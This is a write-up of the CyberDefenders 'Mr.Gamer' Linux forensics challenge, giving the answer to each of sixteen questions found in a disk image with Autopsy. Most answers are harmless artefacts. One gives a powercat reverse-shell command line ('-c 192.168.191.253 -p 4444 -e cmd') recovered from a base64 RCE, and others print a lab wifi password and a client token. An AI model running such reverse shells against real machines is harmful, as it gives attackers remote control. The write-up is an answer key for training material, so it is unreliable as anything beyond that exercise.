# CyberDefenders - Mr.Gamer

## Scenario:

#### This Linux image belongs to a user who likes to play games and communicate with friends. Is there something happening under the hood? Test drive your LinuxForensics skills and identify anomalies!
#### I used autopsy tool for this investigation.
## Questions:
 
### Q1/. I use print statements for my logging -> What is the name of the utility/library the user was looking at exploits for?
#### > log4j

### Q2/. Mischievous Lemur -> What is the version ID number of the operating system on the machine?
![mrgamer1](https://user-images.githubusercontent.com/73375576/225017991-4fddd1dd-cad8-4447-8c17-ce06dc1632a5.png)
#### > 21.10

### Q3/. $whoami -> What is the hostname of the computer?
![mrgamer2](https://user-images.githubusercontent.com/73375576/225019710-884ceea1-c018-4f1a-8632-36bf3b23c628.jpg)
#### > rshell-lenovo

### Q4/. A little blue birdie told me -> What is one anime that the user likes?
![titans](https://user-images.githubusercontent.com/73375576/225019933-5f6e950b-6d9c-4db1-b819-cc6ffdfdf1af.jpg)
#### > Attack on Titan

### Q5/. Into the Matrix, we go -> What is the UUID for the attacker's Minecraft account?
![playerdata](https://user-images.githubusercontent.com/73375576/225020072-4ebcf3b3-d4e5-4177-8984-a1debb8474c4.jpg)
#### > 8b0dec19-b463-477e-9548-eef20c861492

### Q6/. Today's Youtube video is sponsored by... -> What VPN client did the user install and use on the machine?
![vpn](https://user-images.githubusercontent.com/73375576/225020172-598f1945-1bb1-4867-bd8b-2f86aa1fe7f6.jpg)
#### > zerotier

### Q7/. Be our guest -> What was the user's first password for the guest wifi?
![wifipass](https://user-images.githubusercontent.com/73375576/225022962-31ceb719-461b-499f-81f3-e6950c0139c9.jpg)
#### > 093483

### Q8/. If a picture is worth a thousand words, how many is a video worth? -> The user watched a video that premiered on Dec 11th, 2021. How many views did it have when they watched it on February 9th?
![views](https://user-images.githubusercontent.com/73375576/225023489-25ffa890-fa2e-4171-9e41-28c16fe7f964.jpg)
#### > 265342

### Q9/. I'm hungry for videos -> What is the new channel name for the YouTuber whose cookbook is shown on the device?
![babish](https://user-images.githubusercontent.com/73375576/225023671-8c3996c3-4938-41ee-a519-5fd6b8709e97.jpg)
![babish2](https://user-images.githubusercontent.com/73375576/225025173-614ba007-4683-4cd2-8b19-822645b3c231.jpg)
#### > Babish Culinary Universe

### Q10/. Hunt the Wumpus -> What is the module with the highest installed version for the chat application with the mascot Wumpus?
![discordvoice](https://user-images.githubusercontent.com/73375576/225023945-3651d957-ac5f-42fc-9d8f-c04d832df9f3.jpg)
#### > discord_voice

### Q11/. It's raining ocelots and wolves -> According to Windows, what was the temperature in Fahrenheit on February 11th, 2022, at 6:30 PM?
![11feb](https://user-images.githubusercontent.com/73375576/225024118-09914c35-1866-4823-a497-acde281a3aad.jpg)
#### > 45F

### Q12/. Never gonna give... up on this question -> What is the upload date of the second youtube video on the channel from which the user downloaded a youtube video?
![rickrolled](https://user-images.githubusercontent.com/73375576/225024209-16bc8e4a-c0f1-42e7-b6c1-ca00240a51f9.jpg)
#### > 10/25/2009

### Q13/. Buzzy Bees -> What is the SHA-1 hash of Minecraft's "latest" release according to the system?
![grepthisshitout](https://user-images.githubusercontent.com/73375576/225025523-662c94a3-5854-4f3d-abe9-2d43b9799827.jpg)
#### save text locally
#### $ cat version_manifest_v2.txt | grep -i sha-1
#### > 3c6e119c0ff307accf31b596f9cd47ffa2ec6305

### Q14/. The RCE is base(64)d on what? -> What were the three flags and their values that were passed to powercat? The answer must be provided in the same format as the entered command. (For example, if the command was "powercat -D Y -l a -n," the answer would be "-D Y -l a -n")
![Q14](https://user-images.githubusercontent.com/73375576/225026821-c4c8bdb2-44ef-4795-ab4a-326305599319.jpg)
![q142](https://user-images.githubusercontent.com/73375576/225026988-c3e4fde4-04cf-40de-ad72-5e882eb5894c.jpg)
#### > -c 192.168.191.253 -p 4444 -e cmd

### Q15/. Hello (New) World -> How many dimensions (including the overworld) did the player travel to in the "oldest of the worlds"?
![ONE](https://user-images.githubusercontent.com/73375576/225026711-5cc025cb-964a-475a-9257-fc9c60d7f7ef.jpg)
#### > one
### Q16/. Matrix_1999 is the key! -> What is the mojangClientToken stored in the Keystore?
#### > 2f76c8b04c004ddd888a05a6cad6be52
